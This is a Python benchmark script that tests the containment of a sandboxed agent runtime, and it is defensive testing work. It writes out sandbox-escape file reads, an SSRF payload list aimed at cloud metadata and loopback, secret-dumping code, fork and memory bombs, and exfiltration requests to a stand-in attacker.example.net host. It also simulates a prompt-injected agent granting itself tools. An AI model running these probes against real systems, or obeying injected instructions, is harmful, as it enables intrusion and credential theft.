#!/usr/bin/env python3
"""Vultr Agent Runtime security benchmark.

Runs real attacks through the public runtime API on this host and judges
each one from observations made OUTSIDE the sandbox (controller telemetry,
egress-proxy decisions, Docker state on the host, canary tokens that the
sandbox is never told). Nothing here hardcodes a pass.

    sudo /opt/vultr-runtime/venv/bin/python run_benchmark.py            # all 12 tests
    sudo /opt/vultr-runtime/venv/bin/python run_benchmark.py --core     # six core tests
    ... --only ssrf,api_auth   --json-out results.json   --quiet

Writes machine-readable results to /var/lib/vultr-runtime/benchmark/latest.json
(served at GET /v1/security/benchmark) and to --json-out if given.
"""
import argparse
import concurrent.futures as cf
import ipaddress
import json
import os
import secrets
import socket
import subprocess
import sys
import time
import traceback
import urllib.error
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "..", "client"))
from runtime_client import RuntimeClient, RuntimeError_  # noqa: E402

BASE = os.environ.get("RUNTIME_URL", "http://127.0.0.1:8001")
CONF = "/etc/vultr-runtime"
DATA = "/var/lib/vultr-runtime"
FIXTURES = f"{DATA}/bench-fixtures"
VERSION = "1.0.0"
CORE = ["infinite_loop", "sandbox_isolation", "ssrf", "prompt_injection", "secret_hygiene", "lifecycle"]


# ----------------------------------------------------------------- helpers
def read_kv(path):
    out = {}
    with open(path) as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#") and "=" in line:
                k, v = line.split("=", 1)
                out[k] = v
    return out


def docker_exists(kind, ident):
    if not ident:
        return None
    r = subprocess.run(["docker", kind, "inspect", ident] if kind == "network" else ["docker", "inspect", ident],
                       capture_output=True, text=True)
    return r.returncode == 0


def leftover_sandboxes():
    r = subprocess.run(["docker", "ps", "-aq", "--filter", "label=vrt.managed=1"], capture_output=True, text=True)
    return [x for x in r.stdout.split() if x]


def tel_summary(t):
    t = t or {}
    return {k: t.get(k) for k in ("job_id", "profile", "oci_runtime", "container_id", "duration_ms",
                                  "memory_peak_bytes", "memory_limit_bytes", "exit_code", "code_exit_code",
                                  "oom_killed", "timed_out", "cancelled", "security_events", "cleanup",
                                  "policies", "egress", "blocked_operations", "container_log_bytes")}


def http(method, path, key=None, body=None, headers=None):
    req = urllib.request.Request(BASE + path, method=method,
                                 data=json.dumps(body).encode() if body is not None else None)
    if body is not None:
        req.add_header("Content-Type", "application/json")
    if key is not None:
        req.add_header("Authorization", f"Bearer {key}")
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def contains_any(blob, tokens):
    return [t for t in tokens if t and t in blob]


class Bench:
    def __init__(self, quiet=False):
        keys = read_kv(f"{CONF}/benchmark.keys")
        self.key = keys["BENCH_KEY"]
        self.other_key = keys["BENCH_OTHER_KEY"]
        self.rt = RuntimeClient(BASE, api_key=self.key, timeout=60)
        self.other = RuntimeClient(BASE, api_key=self.other_key, timeout=60)
        self.quiet = quiet
        os.makedirs(FIXTURES, exist_ok=True)

    def log(self, *a):
        if not self.quiet:
            print(*a, file=sys.stderr, flush=True)

    # ============================================================ P0 tests
    def t_infinite_loop(self):
        t0 = time.time()
        r = self.rt.run({"profile": "python", "code": "while True:\n    pass\n", "limits": {"timeout_s": 5}}, timeout=120)
        wall = time.time() - t0
        tel = r["telemetry"]
        cid = tel.get("container_id")
        exists = docker_exists("container", cid)
        passed = r["status"] == "timeout" and tel.get("timed_out") is True and wall < 40 and exists is False
        return passed, {
            "status": r["status"], "timeout_s": 5, "observed_wall_s": round(wall, 2),
            "timed_out": tel.get("timed_out"), "timeout_events": [e for e in tel.get("security_events", []) if "timeout" in e],
            "container_exists_after": exists,
        }, tel

    def t_sandbox_isolation(self):
        canary = "VRT-CANARY-OUTSIDE-" + secrets.token_hex(16)
        path = f"{FIXTURES}/outside_sandbox.txt"
        with open(path, "w") as f:
            f.write(canary + "\n")
        os.chmod(path, 0o644)
        code = r'''
import os, json
targets = ["%s", "/proc/1/root%s", "/host%s", "/../../..%s", "/etc/vultr-runtime/backend.key",
           "/etc/vultr-runtime/api_keys.json", "/root/app/.env", "/var/run/docker.sock", "/run/docker.sock",
           "/etc/shadow", "/proc/1/environ"]
report = {"uid": os.getuid(), "gid": os.getgid(), "readable": {}, "missing": [], "denied": []}
for t in targets:
    try:
        with open(t, "rb") as f:
            report["readable"][t] = f.read(4096).decode("utf-8", "replace")
    except FileNotFoundError:
        report["missing"].append(t)
    except PermissionError:
        report["denied"].append(t)
    except Exception as e:
        report["denied"].append(f"{t}: {e.__class__.__name__}")
# Search the whole visible filesystem for any canary-shaped content.
marker = ("VRT-CANARY-" + "OUTSIDE").encode()   # built at runtime so this script never matches itself
hits, scanned = [], 0
for root, dirs, files in os.walk("/", topdown=True):
    if root.startswith(("/proc", "/sys", "/dev")):
        dirs[:] = []
        continue
    for fn in files:
        scanned += 1
        if scanned > 60000:
            break
        p = os.path.join(root, fn)
        try:
            if os.path.getsize(p) > 2_000_000:
                continue
            with open(p, "rb") as f:
                data = f.read()
            if marker in data:
                hits.append({"path": p, "content": data[:200].decode("utf-8", "replace")})
        except Exception:
            pass
report["fs_scanned_files"] = scanned
report["canary_hits"] = hits
try:
    report["mounts"] = [l.split()[4] for l in open("/proc/self/mountinfo")][:40]
except Exception as e:
    report["mounts"] = str(e)
print(json.dumps(report))
''' % (path, path, path, path)
        r = self.rt.run({"profile": "python", "code": code, "limits": {"timeout_s": 60}}, timeout=180)
        blob = json.dumps(r)
        leaked = canary in blob
        try:
            rep = json.loads(r["stdout"])
        except ValueError:
            rep = {"raw": r["stdout"][:500]}
        sock_visible = any("docker.sock" in k for k in rep.get("readable", {}))
        passed = (r["status"] == "succeeded" and not leaked and not sock_visible
                  and rep.get("uid") not in (0, None))
        return passed, {
            "controlled_file": path, "canary_leaked": leaked, "sandbox_uid": rep.get("uid"),
            "files_scanned_in_sandbox": rep.get("fs_scanned_files"), "canary_hits": rep.get("canary_hits"),
            "host_paths_missing": rep.get("missing"), "host_paths_denied": rep.get("denied"),
            "docker_socket_visible": sock_visible, "status": r["status"],
        }, r["telemetry"]

    def t_lifecycle(self):
        cases = []
        jobs = [
            ("success", {"profile": "python", "code": "print('ok')"}),
            ("failure", {"profile": "python", "code": "raise SystemExit(3)"}),
            ("timeout", {"profile": "python", "code": "import time\ntime.sleep(60)", "limits": {"timeout_s": 3}}),
            ("networked", {"profile": "python-net", "code": "print('net')", "network": {"allowed_domains": ["example.com"]}}),
            ("browser", {"profile": "browser", "browser": {"html_content": "<p>x</p>", "screenshot": False},
                         "network": {"allowed_domains": ["example.com"]}}),
        ]
        all_ok = True
        last_tel = None
        for name, job in jobs:
            r = self.rt.run(job, timeout=240)
            tel = r["telemetry"]
            last_tel = tel
            cid = tel.get("container_id")
            c_exists = docker_exists("container", cid)
            net = f"vrt-{tel.get('job_id')}" if job["profile"] != "python" else None
            n_exists = docker_exists("network", net) if net else None
            ok = c_exists is False and (n_exists in (None, False)) and tel["cleanup"].get("container_removed") is True
            all_ok &= ok
            cases.append({"case": name, "status": r["status"], "container_id": (cid or "")[:12],
                          "container_exists_after": c_exists, "network_exists_after": n_exists,
                          "controller_cleanup": tel.get("cleanup"), "passed": ok})
        left = leftover_sandboxes()
        passed = all_ok and not left
        return passed, {"cases": cases, "leftover_sandbox_containers": left}, last_tel

    def t_api_auth(self):
        own = self.rt.submit({"profile": "python", "code": "print(1)"})
        jid = own["id"]
        self.rt.wait(jid, timeout=120)
        checks = []

        def check(name, status, expect):
            checks.append({"check": name, "http_status": status, "expected": expect, "passed": status == expect})

        body = {"profile": "python", "code": "print('should never run')"}
        check("submit without credentials", http("POST", "/v1/jobs", None, body)[0], 401)
        check("submit with invalid key", http("POST", "/v1/jobs", "vrt_invalid_" + secrets.token_hex(8), body)[0], 401)
        check("submit with malformed auth header", http("POST", "/v1/jobs", None, body, {"Authorization": "Basic Zm9vOmJhcg=="})[0], 401)
        check("compat /run without credentials", http("POST", "/run", None, {"code": "print(1)"})[0], 401)
        check("compat /screenshot without credentials", http("POST", "/screenshot", None, {"url": "https://example.com"})[0], 401)
        check("read job without credentials", http("GET", f"/v1/jobs/{jid}")[0], 401)
        check("other principal reads job", http("GET", f"/v1/jobs/{jid}", self.other_key)[0], 404)
        check("other principal reads result", http("GET", f"/v1/jobs/{jid}/result", self.other_key)[0], 404)
        check("other principal lists artifacts", http("GET", f"/v1/jobs/{jid}/artifacts", self.other_key)[0], 404)
        check("other principal cancels job", http("DELETE", f"/v1/jobs/{jid}", self.other_key)[0], 404)
        check("caller-supplied docker options rejected",
              http("POST", "/v1/jobs", self.key, dict(body, docker={"privileged": True, "binds": ["/:/host"]}))[0], 422)
        check("caller-supplied env rejected", http("POST", "/v1/jobs", self.key, dict(body, env={"LD_PRELOAD": "x"}))[0], 422)
        check("limits above profile rejected",
              http("POST", "/v1/jobs", self.key, dict(body, limits={"memory_mb": 4096}))[0], 422)
        check("owner reads job", http("GET", f"/v1/jobs/{jid}", self.key)[0], 200)
        passed = all(c["passed"] for c in checks)
        return passed, {"checks": checks}, None

    # ============================================================ P1 tests
    def t_ssrf(self):
        forbidden = [
            "http://169.254.169.254/latest/meta-data/",
            "http://2852039166/latest/meta-data/",          # decimal 169.254.169.254
            "http://[fd00:ec2::254]/latest/meta-data/",    # IPv6 metadata
            "http://100.100.100.200/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://127.0.0.1/", "http://127.0.0.1:8001/health",   # loopback / the runtime API itself
            "http://localhost/",
            "http://2130706433/",                           # decimal 127.0.0.1
            "http://0x7f000001/",                           # hex 127.0.0.1
            "http://0177.0.0.1/",                           # octal 127.0.0.1
            "http://[::1]/",
            "http://[::ffff:127.0.0.1]/",                   # IPv4-mapped IPv6 loopback
            "http://[::ffff:a9fe:a9fe]/",                   # IPv4-mapped metadata
            "http://[64:ff9b::a9fe:a9fe]/",                 # NAT64-embedded metadata
            "http://0.0.0.0/",
            "http://10.0.0.1/", "http://172.17.0.1/", "http://192.168.1.1/", "http://10.251.0.1/",
            "http://100.64.0.1/",                           # CGNAT
            "http://70.34.217.56/", "https://70.34.217.56/", "http://70.34.217.56:22/",   # host public address
            "http://localtest.me/",                         # public DNS name -> 127.0.0.1 (rebinding-style)
            "http://127.0.0.1.nip.io/",                     # public DNS name -> 127.0.0.1
            "http://169.254.169.254.nip.io/latest/meta-data/",
            "http://10.0.0.1.nip.io/",
            "https://example.com:22/",                      # disallowed port on a public host
        ]
        redirects = [
            "https://postman-echo.com/redirect-to?url=http://169.254.169.254/latest/meta-data/",
            "https://postman-echo.com/redirect-to?url=http://127.0.0.1/",
            "https://postman-echo.com/redirect-to?url=http://10.0.0.1/",
        ]
        code = r'''
import json, socket, requests
forbidden = %s
redirects = %s
out = {"forbidden": [], "redirects": [], "control": None, "bypass": []}
def probe(u):
    try:
        r = requests.get(u, timeout=8, allow_redirects=True)
        hist = [h.status_code for h in r.history]
        blocked = r.headers.get("X-VRT-Blocked")
        return {"url": u, "http_status": r.status_code, "blocked_by": blocked, "redirects": hist,
                "final_url": r.url, "body_sample": r.text[:120]}
    except Exception as e:
        return {"url": u, "exception": f"{e.__class__.__name__}: {str(e)[:160]}"}
for u in forbidden:
    out["forbidden"].append(probe(u))
for u in redirects:
    out["redirects"].append(probe(u))
out["control"] = probe("https://example.com/")
# Attempts to bypass the proxy entirely.
for host, port in [("1.1.1.1", 443), ("8.8.8.8", 53), ("70.34.217.56", 22), ("169.254.169.254", 80), ("10.250.0.1", 22)]:
    try:
        s = socket.create_connection((host, port), timeout=3); s.close()
        out["bypass"].append({"target": f"{host}:{port}", "connected": True})
    except Exception as e:
        out["bypass"].append({"target": f"{host}:{port}", "connected": False, "error": e.__class__.__name__})
try:
    socket.getaddrinfo("example.com", 443)
    out["local_dns"] = "resolved"
except Exception as e:
    out["local_dns"] = f"failed: {e.__class__.__name__}"
print(json.dumps(out))
''' % (json.dumps(forbidden), json.dumps(redirects))
        r = self.rt.run({"profile": "python-net", "code": code, "network": {"allowed_domains": ["*"]},
                         "limits": {"timeout_s": 120}}, timeout=300)
        tel = r["telemetry"]
        try:
            rep = json.loads(r["stdout"])
        except ValueError:
            return False, {"error": "no report", "stdout": r["stdout"][:500], "stderr": r["stderr"][-800:]}, tel
        # Independent judgement from the proxy's own decisions:
        dests = tel.get("egress", {}).get("destinations", [])
        non_public = [d for d in dests if d.get("connected_ip") and not ipaddress.ip_address(d["connected_ip"]).is_global]
        allowed_hosts = sorted({d["host"] for d in dests})
        results = []
        for p in rep["forbidden"]:
            reached = "http_status" in p and not p.get("blocked_by") and p["http_status"] < 400 and \
                not (p.get("final_url", "").startswith("http://httpbin.org") and p["http_status"] in (301, 302))
            results.append({"url": p["url"], "outcome": "blocked" if p.get("blocked_by") else
                            ("reached" if reached else "not reached"),
                            "reason": p.get("blocked_by") or p.get("exception") or p.get("http_status")})
        redirect_results = []
        for p in rep.get("redirects", []):
            followed = any(300 <= h < 400 for h in p.get("redirects", []))
            if p.get("blocked_by") and followed:
                outcome = "redirect followed, target blocked"
            elif "http_status" in p and not p.get("blocked_by") and p["http_status"] < 400 and not followed:
                outcome = "inconclusive (no redirect issued)"
            elif "http_status" in p and not p.get("blocked_by") and p["http_status"] < 400:
                outcome = "reached"
            else:
                outcome = "not reached"
            redirect_results.append({"url": p["url"], "outcome": outcome, "redirect_chain": p.get("redirects"),
                                     "reason": p.get("blocked_by") or p.get("exception") or p.get("http_status")})
        results += [dict(r, kind="redirect") for r in redirect_results]
        reached = [x for x in results if x["outcome"] == "reached"]
        redirect_verified = sum(1 for r in redirect_results if r["outcome"] == "redirect followed, target blocked")
        control_ok = (rep.get("control") or {}).get("http_status") == 200
        bypass_ok = all(not b["connected"] for b in rep["bypass"])
        passed = (r["status"] == "succeeded" and not reached and not non_public and control_ok and bypass_ok
                  and str(rep.get("local_dns", "")).startswith("failed"))
        return passed, {
            "forbidden_targets": len(results), "blocked_or_unreachable": len(results) - len(reached),
            "reached_forbidden": reached, "results": results,
            "proxy_connections_to_non_public_ips": non_public, "proxy_allowed_hosts": allowed_hosts,
            "control_public_request": rep.get("control", {}).get("http_status"),
            "redirects_verified_blocked": redirect_verified, "direct_socket_bypass": rep["bypass"], "local_dns_in_sandbox": rep.get("local_dns"),
            "proxy_blocked_count": tel.get("egress", {}).get("blocked"),
        }, tel

    def t_prompt_injection(self):
        html = open(os.path.join(HERE, "fixtures", "prompt_injection.html"), encoding="utf-8").read()
        forbidden_hosts = {"169.254.169.254", "127.0.0.1", "attacker.example.net", "10.0.0.1", "70.34.217.56",
                           "exfil.attacker.example.net"}
        # Phase A: hostile page loaded in the sandboxed browser; its scripts try to exfiltrate.
        r = self.rt.run({"profile": "browser",
                         "browser": {"html_content": html, "wait_until": "load",
                                     "actions": [{"type": "wait", "ms": 3000},
                                                 {"type": "extract_text", "selector": "#price", "name": "price"},
                                                 {"type": "extract_attribute", "selector": "body", "attr": "data-exfil", "name": "page_js_report"}],
                                     "screenshot": True},
                         "network": {"allowed_domains": ["example.com"]},
                         "permissions": {"allowed_actions": ["wait", "extract_text", "extract_attribute"]},
                         "limits": {"timeout_s": 60}}, timeout=240)
        tel = r["telemetry"]
        dests = tel.get("egress", {}).get("destinations", [])
        allowed_forbidden = [d for d in dests if d.get("host") in forbidden_hosts or
                             (d.get("connected_ip") and not ipaddress.ip_address(d["connected_ip"]).is_global)]
        proxy_blocks = [b for b in tel.get("blocked_operations", []) if b.get("source") == "egress-proxy"]
        phase_a = {"status": r["status"], "extracted_price": (r.get("browser") or {}).get("extracted", {}).get("price"),
                   "proxy_blocked_subrequests": [{"op": b["operation"], "reason": b["reason"]} for b in proxy_blocks],
                   "browser_failed_requests": len((r.get("browser") or {}).get("failed_requests", [])),
                   "allowed_connections_to_forbidden": allowed_forbidden}
        phase_a_ok = r["status"] == "succeeded" and not allowed_forbidden and len(proxy_blocks) >= 3

        # Phase B: a naive agent obeys the injected instructions. Enforced policy must stop it.
        naive = []

        def attempt(name, job, expect_status, expect_code=None):
            st, body = http("POST", "/v1/jobs", self.key, job)
            try:
                b = json.loads(body)
            except ValueError:
                b = {}
            ok = st == expect_status and (expect_code is None or b.get("error") == expect_code)
            naive.append({"attempt": name, "http_status": st, "error": b.get("error"), "detail": b.get("detail"),
                          "blocked": ok})

        base_net = {"allowed_domains": ["example.com"]}
        attempt("navigate to cloud metadata", {"profile": "browser", "network": base_net,
                "browser": {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}},
                403, "navigation_forbidden_destination")
        attempt("navigate to attacker exfil URL", {"profile": "browser", "network": base_net,
                "browser": {"url": "https://example.com", "actions": [
                    {"type": "goto", "url": "https://attacker.example.net/collect?d=secrets"}]}},
                403, "navigation_outside_allowlist")
        attempt("fill password field (tool not permitted)", {"profile": "browser", "network": base_net,
                "browser": {"url": "https://example.com", "actions": [
                    {"type": "fill", "selector": "#password", "value": "hunter2"}]}}, 403, "tool_not_permitted")
        attempt("run arbitrary JavaScript (tool does not exist)", {"profile": "browser", "network": base_net,
                "browser": {"url": "https://example.com", "actions": [
                    {"type": "evaluate", "value": "fetch('http://169.254.169.254')"}]}}, 403, "unknown_tool")
        attempt("grant itself extra tools", {"profile": "browser", "network": base_net,
                "permissions": {"allowed_actions": ["shell", "download"]},
                "browser": {"url": "https://example.com"}}, 403, "unknown_tool")
        attempt("override runtime security policy", {"profile": "browser", "network": dict(base_net, bypass_proxy=True),
                "browser": {"url": "https://example.com"}}, 422)
        attempt("request privileged container", {"profile": "python", "code": "print(1)", "privileged": True}, 422)

        # Generated code that follows the injection still runs inside the enforced egress policy.
        code = r'''
import requests, json
res = []
for u in ["http://169.254.169.254/latest/meta-data/", "https://attacker.example.net/collect?d=secret",
          "http://127.0.0.1:8001/v1/jobs", "https://exfil.attacker.example.net/x"]:
    try:
        r = requests.get(u, timeout=6)
        res.append({"url": u, "status": r.status_code, "blocked_by": r.headers.get("X-VRT-Blocked")})
    except Exception as e:
        res.append({"url": u, "exception": e.__class__.__name__})
print(json.dumps(res))
'''
        r2 = self.rt.run({"profile": "python-net", "code": code, "network": base_net}, timeout=180)
        tel2 = r2["telemetry"]
        dests2 = tel2.get("egress", {}).get("destinations", [])
        try:
            gen = json.loads(r2["stdout"])
        except ValueError:
            gen = r2["stdout"][:300]
        gen_ok = r2["status"] == "succeeded" and not dests2 and tel2.get("egress", {}).get("blocked", 0) >= 4
        naive.append({"attempt": "generated code follows injection (egress)", "blocked": gen_ok,
                      "proxy_blocked": tel2.get("egress", {}).get("blocked"), "proxy_allowed": len(dests2),
                      "observed": gen})
        phase_b_ok = all(n["blocked"] for n in naive)
        return phase_a_ok and phase_b_ok, {"hostile_page": phase_a, "naive_agent_attempts": naive}, tel

    def t_secret_hygiene(self):
        host_secret = "SYNTHHOST-" + secrets.token_hex(16)
        path = f"{FIXTURES}/host_secret.env"
        with open(path, "w") as f:
            f.write(f"SYNTH_HOST_SECRET={host_secret}\n")
        os.chmod(path, 0o644)
        env = read_kv(f"{CONF}/runtime.env")
        backend_cred = env.get("VRT_SYNTHETIC_BACKEND_CREDENTIAL", "")
        real_keys = [open(f"{CONF}/backend.key").read().strip(), self.key, self.other_key,
                     open(f"{CONF}/proxy_hmac.key").read().strip()]
        code = r'''
import os, glob, json, requests
dump = {"env": dict(os.environ), "proc_environ": {}, "files": {}, "metadata": None}
for p in glob.glob("/proc/*/environ") + glob.glob("/proc/*/cmdline"):
    try:
        dump["proc_environ"][p] = open(p, "rb").read().decode("utf-8", "replace")
    except Exception as e:
        dump["proc_environ"][p] = f"ERR {e.__class__.__name__}"
for p in ["%s", "/etc/vultr-runtime/runtime.env", "/etc/vultr-runtime/backend.key",
          "/etc/vultr-runtime/proxy_hmac.key", "/etc/vultr-runtime/benchmark.keys", "/run/secrets/proxy_hmac",
          "/root/app/.env", "/proc/1/root/etc/vultr-runtime/runtime.env"]:
    try:
        dump["files"][p] = open(p).read()
    except Exception as e:
        dump["files"][p] = f"ERR {e.__class__.__name__}"
for u in ["http://169.254.169.254/latest/meta-data/iam/security-credentials/", "http://127.0.0.1:8001/v1/security/benchmark"]:
    try:
        r = requests.get(u, timeout=5)
        dump["metadata"] = (dump["metadata"] or "") + f"{u} -> {r.status_code} {r.text[:200]}\n"
    except Exception as e:
        dump["metadata"] = (dump["metadata"] or "") + f"{u} -> {e.__class__.__name__}\n"
print(json.dumps(dump))
''' % path
        r = self.rt.run({"profile": "python-net", "code": code, "network": {"allowed_domains": ["*"]}}, timeout=180)
        blob = json.dumps(r)
        for a in r.get("artifacts", []):
            blob += self.rt.artifact(r["job_id"], a["name"]).decode("utf-8", "replace")
        leaked = contains_any(blob, [host_secret, backend_cred] + real_keys)
        labels = {host_secret: "synthetic host secret file", backend_cred: "synthetic backend credential (controller env)"}
        try:
            dump = json.loads(r["stdout"])
            env_keys = sorted(dump["env"].keys())
        except (ValueError, KeyError):
            env_keys = None
        passed = r["status"] == "succeeded" and not leaked and bool(backend_cred)
        return passed, {
            "secrets_checked": ["synthetic host secret file", "synthetic backend credential (controller env)",
                                "backend API key", "benchmark API keys", "egress proxy HMAC key"],
            "leaked": [labels.get(x, "real credential (value withheld)") for x in leaked],
            "sandbox_env_keys": env_keys,
            "note": "VRT_PROXY_* / HTTP(S)_PROXY carry a job-scoped proxy token that is revoked when the job ends.",
        }, r["telemetry"]

    def t_memory(self):
        code = r'''
import sys
blocks, mb = [], 0
try:
    while mb < 2048:
        blocks.append(bytearray(16 * 1024 * 1024)); mb += 16
        print(f"allocated {mb} MB", flush=True)
    print("ALLOCATED_2GB")
except MemoryError:
    print(f"MemoryError at {mb} MB", flush=True)
    sys.exit(42)
'''
        r1 = self.rt.run({"profile": "python", "code": code, "limits": {"memory_mb": 128, "timeout_s": 60}}, timeout=180)
        # Same allocation without RLIMIT_AS (browser profile): the cgroup limit must act.
        r2 = self.rt.run({"profile": "browser", "code": code, "network": {"allowed_domains": ["example.com"]},
                          "limits": {"memory_mb": 256, "timeout_s": 60}}, timeout=180)
        cases = []
        ok = True
        for name, r, lim in (("python profile (rlimit + cgroup)", r1, 128), ("cgroup only", r2, 256)):
            tel = r["telemetry"]
            got_2gb = "ALLOCATED_2GB" in (r.get("stdout") or "")
            peak = tel.get("memory_peak_bytes") or 0
            within = peak <= lim * 1024 * 1024 * 1.10 if peak else None
            c_ok = not got_2gb and r["status"] in ("failed", "timeout") and within is not False
            ok &= c_ok
            last = [l for l in (r.get("stdout") or "").splitlines() if l][-1:] or [None]
            cases.append({"case": name, "limit_mb": lim, "status": r["status"], "error": r.get("error"),
                          "oom_killed": tel.get("oom_killed"), "exit_code": tel.get("code_exit_code"),
                          "last_output": last[0], "memory_peak_mb": round(peak / 1048576, 1) if peak else None,
                          "memory_source": tel.get("memory_source"), "passed": c_ok})
        return ok, {"cases": cases}, r2["telemetry"]

    def t_process(self):
        code = r'''
import subprocess, os, time
procs, err = [], None
for i in range(1000):
    try:
        procs.append(subprocess.Popen(["sleep", "30"]))
    except Exception as e:
        err = f"{e.__class__.__name__}: {e}"
        break
print(f"spawned {len(procs)} processes; stopped by: {err}")
forks, ferr = 0, None
try:
    for i in range(1000):
        pid = os.fork()
        if pid == 0:
            time.sleep(30); os._exit(0)
        forks += 1
except Exception as e:
    ferr = f"{e.__class__.__name__}: {e}"
print(f"forked {forks} more; stopped by: {ferr}")
'''
        r = self.rt.run({"profile": "python", "code": code, "limits": {"timeout_s": 30}}, timeout=180)
        out = r.get("stdout") or ""
        import re
        m = re.search(r"spawned (\d+)", out)
        spawned = int(m.group(1)) if m else None
        m2 = re.search(r"forked (\d+)", out)
        forked = int(m2.group(1)) if m2 else 0
        limit = (r["telemetry"].get("policies") or {}).get("pids_limit")
        total = (spawned or 0) + forked
        passed = spawned is not None and total < 1000 and limit is not None and total <= limit and \
            r["telemetry"]["cleanup"].get("container_removed") is True
        return passed, {"pids_limit": limit, "host_pids_backstop": (r["telemetry"].get("policies") or {}).get("host_pids_backstop"),
                        "spawned": spawned, "forked": forked, "total": total,
                        "stdout": out[-400:], "status": r["status"]}, r["telemetry"]

    def t_cross_job(self):
        token = "VRT-CROSSJOB-" + secrets.token_hex(16)
        code_a = r'''
import time, os
open("/work/secret_a.txt", "w").write("%s")
open("/tmp/secret_a.txt", "w").write("%s")
os.makedirs("/work/output", exist_ok=True)
open("/work/output/secret_a.txt", "w").write("%s")
print("A ready", flush=True)
time.sleep(14)
''' % (token, token, token)
        code_b = r'''
import os, glob, json
found = {"files": [], "pids": sorted(int(p) for p in os.listdir("/proc") if p.isdigit()), "cmdlines": []}
for pat in ["/work/*", "/tmp/*", "/work/**/*", "/tmp/**/*", "/proc/*/root/work/*", "/proc/*/root/tmp/*", "/dev/shm/*"]:
    for p in glob.glob(pat, recursive=True):
        try:
            found["files"].append({"path": p, "data": open(p).read(200)})
        except Exception:
            found["files"].append({"path": p, "data": None})
for p in found["pids"]:
    try:
        found["cmdlines"].append(open(f"/proc/{p}/cmdline").read().replace("\0", " ")[:100])
    except Exception:
        pass
print(json.dumps(found))
'''
        ja = self.rt.submit({"profile": "python", "code": code_a, "limits": {"timeout_s": 30}})
        for _ in range(60):
            if self.rt.job(ja["id"])["status"] == "running":
                break
            time.sleep(0.5)
        time.sleep(3)
        rb = self.rt.run({"profile": "python", "code": code_b, "limits": {"timeout_s": 20}}, timeout=120)
        ra = self.rt.wait(ja["id"], timeout=120)
        # Also: the other principal cannot fetch job A's artifact.
        st, _ = http("GET", f"/v1/jobs/{ja['id']}/artifacts/secret_a.txt", self.other_key)
        leaked = token in json.dumps(rb)
        try:
            rep = json.loads(rb["stdout"])
        except ValueError:
            rep = {}
        sees_a = any("main.py" in c and "sleep" in c for c in rep.get("cmdlines", []))
        overlap = rb["telemetry"].get("started_at") and ra["telemetry"].get("finished_at") and \
            rb["telemetry"]["started_at"] < ra["telemetry"]["finished_at"]
        passed = not leaked and st == 404 and ra["status"] == "succeeded" and rb["status"] == "succeeded" and bool(overlap)
        return passed, {"job_a": ja["id"], "job_b": rb["job_id"], "ran_concurrently": bool(overlap),
                        "token_visible_to_b": leaked, "b_visible_pids": rep.get("pids"),
                        "b_visible_files": [f["path"] for f in rep.get("files", [])][:20],
                        "a_process_visible_to_b": sees_a, "other_principal_artifact_http": st}, rb["telemetry"]

    def t_output(self):
        code = r'''
import sys
line = "A" * 1023 + "\n"
for i in range(300 * 1024):      # 300 MB to stdout
    sys.stdout.write(line)
'''
        r1 = self.rt.run({"profile": "python", "code": code, "limits": {"timeout_s": 40, "max_output_kb": 256}}, timeout=180)
        # Bypass the runner: write straight to the container's stdout (fd of PID 1's child).
        code2 = r'''
import os
fd = os.open("/proc/1/fd/1", os.O_WRONLY)
chunk = b"B" * 65536
for i in range(1600):            # 100 MB straight into the container log
    os.write(fd, chunk)
print("done")
'''
        r2 = self.rt.run({"profile": "python", "code": code2, "limits": {"timeout_s": 40}}, timeout=180)
        t1, t2 = r1["telemetry"], r2["telemetry"]
        ret = len((r1.get("stdout") or "").encode())
        c1 = ret <= 256 * 1024 and r1.get("stdout_truncated") is True and r1["status"] in ("succeeded", "failed", "timeout")
        logb = t2.get("container_log_bytes") or 0
        c2 = logb <= 40 * 1024 * 1024
        return c1 and c2, {
            "runner_stdout": {"attempted_bytes": 300 * 1024 * 1024, "status": r1["status"],
                              "returned_bytes": ret, "truncated": r1.get("stdout_truncated"),
                              "produced_bytes_seen": (t1.get("output") or {}).get("stdout_bytes"), "passed": c1},
            "direct_container_stdout": {"attempted_bytes": 100 * 1024 * 1024, "status": r2["status"],
                                        "container_log_bytes": logb, "log_cap": "32m", "passed": c2},
        }, t1

    def t_cancellation(self):
        j = self.rt.submit({"profile": "python", "code": "import time\nwhile True: time.sleep(1)", "limits": {"timeout_s": 120}})
        for _ in range(120):
            v = self.rt.job(j["id"])
            if v["status"] == "running" and (v.get("telemetry") or {}).get("container_id"):
                break
            time.sleep(0.25)
        cid = (v.get("telemetry") or {}).get("container_id")
        running_before = docker_exists("container", cid)
        t0 = time.time()
        self.rt.cancel(j["id"])
        r = self.rt.wait(j["id"], timeout=60)
        dt = time.time() - t0
        exists = docker_exists("container", cid)
        # Cancelling a queued job never starts a container.
        passed = r["status"] == "cancelled" and running_before is True and exists is False and dt < 15
        return passed, {"container_id": (cid or "")[:12], "container_running_before_cancel": running_before,
                        "status": r["status"], "seconds_to_terminate_and_clean": round(dt, 2),
                        "container_exists_after": exists, "cleanup": r["telemetry"].get("cleanup")}, r["telemetry"]


TESTS = [
    ("infinite_loop", "Infinite loop", "P0", "t_infinite_loop"),
    ("sandbox_isolation", "Sandbox isolation", "P0", "t_sandbox_isolation"),
    ("ssrf", "SSRF protection", "P1", "t_ssrf"),
    ("prompt_injection", "Prompt injection", "P1", "t_prompt_injection"),
    ("secret_hygiene", "Secret hygiene", "P1", "t_secret_hygiene"),
    ("lifecycle", "Lifecycle", "P0", "t_lifecycle"),
    ("memory_exhaustion", "Memory exhaustion", "P1", "t_memory"),
    ("process_exhaustion", "Process exhaustion", "P1", "t_process"),
    ("cross_job_isolation", "Cross-job isolation", "P1", "t_cross_job"),
    ("api_authentication", "API authentication", "P0", "t_api_auth"),
    ("output_exhaustion", "Output exhaustion", "P1", "t_output"),
    ("cancellation", "Cancellation", "P1", "t_cancellation"),
]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--core", action="store_true", help="run only the six core containment tests")
    ap.add_argument("--only", help="comma separated test ids")
    ap.add_argument("--json-out")
    ap.add_argument("--quiet", action="store_true")
    ap.add_argument("--no-publish", action="store_true", help="do not update the served latest.json")
    args = ap.parse_args()

    b = Bench(quiet=args.quiet)
    health = b.rt.health()
